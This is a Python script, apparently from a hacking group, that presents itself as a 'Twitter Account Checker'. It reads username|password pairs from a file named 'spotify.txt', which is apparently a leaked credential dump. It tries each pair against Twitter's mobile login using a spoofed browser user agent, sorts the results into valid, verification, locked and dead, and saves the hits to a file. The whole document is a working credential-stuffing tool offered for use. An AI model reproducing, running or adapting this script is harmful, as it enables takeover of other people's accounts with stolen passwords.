import mechanize
from mechanize import Browser
import requests, os, sys, time
import os, sys, requests
import threading
import multiprocessing
from multiprocessing import Process



def banner():
	print ("""
	Twitter Account Checker
	cod3d by : Zekkel AR
	Team     : Family Attack Cyber
	Gr33tz   : Kowalskyi - radicalHaxor - Agung Sans
	Version  : 1.0
	""")
def twitter():
	sukses=[]
	brows = Browser()
	brows.set_handle_robots(False)
	brows._factory.is_html = True
	brows.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)')]
	password = open('spotify.txt', 'r').readlines()
	for a in password:
		ab = a.strip()
		ac = ab.split('|')
		reks1 = ac[0]
		reks12=ac[1]
		url = "https://mobile.twitter.com/login"
		brows.open(url, timeout=10)
		brows.select_form(nr=0)
		brows.form['session[username_or_email]']=reks1
		brows.form['session[password]']=reks12
		brows.method='POST'
		submit=brows.submit()
		if submit.geturl() == "https://mobile.twitter.com/home":
			print('[ VALID ] {}' .format(ab))
			sukses.append(ab)
		elif 'https://mobile.twitter.com/account/login_challenge' in submit.geturl():
			print('[ VERIVIKASI ] {}' .format(ab))
			sukses.append(ab)
		elif 'https://mobile.twitter.com/account/locked' in submit.geturl():
			print('[ ACCOUNT LOCKED ] {}' .format(ab))
			sukses.append(ab)
		else:
			print('[ DIE ] {}' .format(ab))

		with open("result.txt", "w") as f:
			for s in sukses:
				f.write(str(s) + '\n')
def zekkel():
	asede = threading.Thread(target=twitter)
	asede.start()


if __name__ == "__main__":
	os.system('clear')
	banner()
	zekkel()
